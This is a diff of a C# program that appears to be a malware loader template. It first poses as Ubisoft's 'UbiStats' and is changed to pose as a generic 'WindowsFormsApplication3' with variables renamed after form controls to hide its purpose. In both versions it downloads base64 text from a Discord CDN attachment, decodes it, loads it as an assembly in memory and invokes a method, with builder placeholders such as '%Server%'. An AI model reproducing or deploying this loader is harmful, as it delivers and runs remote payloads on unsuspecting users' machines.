@@ -13,12 +13,11 @@ using System.Windows.Forms;
 
 
 
-//Default [assembly: AssemblyTitle("UbiStats")]
-//Default [assembly: AssemblyDescription("UbiStats for ALL_ALL_GLOBAL")]
-//Default [assembly: AssemblyCompany("Ubisoft")]
-//Default [assembly: AssemblyProduct("Ubisoft UbiStats ")]
-//Default [assembly: AssemblyCopyright("Copyright © 2005")]
-//Default [assembly: AssemblyFileVersion("2.5.0.1")]
+//Default [assembly: AssemblyTitle("WindowsFormsApplication3.exe")]
+//Default [assembly: AssemblyDescription("WindowsFormsApplication3")]
+//Default [assembly: AssemblyProduct("WindowsFormsApplication3")]
+//Default [assembly: AssemblyCopyright("Copyright ©  2015")]
+//Default [assembly: AssemblyFileVersion("1.0.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -28,8 +27,14 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-    public class Program
+public class WindowsFormsApplication3
     {
+
+        [DllImport("User32.dll")]
+        private static extern int SendMessage(IntPtr hWnd, int msg, int wParam, ref int lParam);
+        [DllImport("user32")]
+        public static extern int ReleaseCapture(IntPtr hwnd);
+
         [STAThread]
         public static void Main(string[] args)
         {
@@ -62,34 +67,38 @@ using System.Windows.Forms;
 
 
 
-                    string ilspy;
+                    string radioButton1;
 
-                    ilspy = "https://cdn.discordapp.com/attachments/841595401253158954/844366341158076416/upload.txt";
+                    radioButton1 = "https://cdn.discordapp.com/attachments/844669981151985754/844685067003756574/message.txt";
 
-                    WebClient HT203794;
+                    WebClient checkBox23;
 
-                    HT203794 = new WebClient();
+                    checkBox23 = new WebClient();
 
-                    string stats;
+                    string textBox18;
 
-                    stats = HT203794.DownloadString(ilspy);
+                    textBox18 = checkBox23.DownloadString(radioButton1);
+
+                    byte[] comboBox2;
+
+                    comboBox2 = Convert.FromBase64String(textBox18);
+
+                    string amountPaid = "pizzaorder.buynow";
+
+                    string net_classes_objects = "meseken";
 
 
-                    byte[] onedrive;
+                    object comboBox2_SelectedIndexChanged = new object[] { %aPP%, string.Empty, web.DownloadData("%Server%"), true };
 
-                    string download = "https://onedrive.live.com/";
+                    string tabPage3_Click = amountPaid;
 
-                    Console.WriteLine(download);
 
-                    onedrive = Convert.FromBase64String(stats);
+                    Assembly assembly;
 
-                    string translator = "ShutDown.frmclass";
+                    assembly = AppDomain.CurrentDomain.Load(comboBox2);
 
-                    object cfg = new object[] {%aPP%, string.Empty, web.DownloadData("%Server%"), true };
 
-                    string waf = translator;
-
-                    AppDomain.CurrentDomain.Load(onedrive).GetType(waf).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])cfg);
+                    assembly.GetType(tabPage3_Click).InvokeMember(net_classes_objects, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])comboBox2_SelectedIndexChanged);
 
 
 
